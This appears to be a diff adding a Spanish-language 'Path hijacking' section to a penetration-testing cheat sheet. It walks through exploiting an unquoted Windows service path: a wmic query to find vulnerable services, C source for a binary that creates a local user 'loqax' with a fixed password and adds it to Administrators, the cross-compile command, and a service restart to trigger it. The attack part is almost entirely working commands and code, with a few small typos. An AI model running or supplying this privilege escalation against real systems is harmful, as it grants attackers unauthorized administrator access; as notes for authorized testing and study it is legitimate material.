@@ -265,6 +265,38 @@ Obtener hash NTLM desde un formulario de carga de archivos:
 
   Y comprobamos que se han ejecutado nuestros comandos, habiendo creado un usuario dave2 y añadiendóle al grupo Administrators.
 
+## Path hijacking
+
+  Encontramos algún path de un binario sin comillas:
+
+    wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+  Con icals, comprobamos si en alguna de las carpetas del path podemos escribir con nuestro usuario actual. Por ejemplo, en el siguiente path:
+
+    C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+
+  Si tenemos permiso de escritura en 'Current Version', tenemos que crear un binario llamado 'Current.exe', ya que Windows intentará ejecutar ese binario. Si fuese en 'Enterprise Apps', sería 'Enterprise.exe'.
+
+  Creamos el binario:
+
+    #include <stdlib.h>
+    
+    int main ()
+    {
+      int i;
+      
+      i = system ("net user loqax loqax1234! /add");
+      i = system ("net localgroup administrators loqax /add");
+      
+      return 0;
+    }
+
+  Compilamos:
+
+    x86_64-w64-mingw32-gcc mysql.c -o Current.exe
+
+  Y lo subimos al path vulnerable. Ejecutamos 'Restar-Service service_name' y el comando dentro de nuestro binario malicioso se habrá ejecutado.
+
 ## Vulnerabilidades conocidas
 
 Apache HTTP Server 2.4.49 - Path traversal
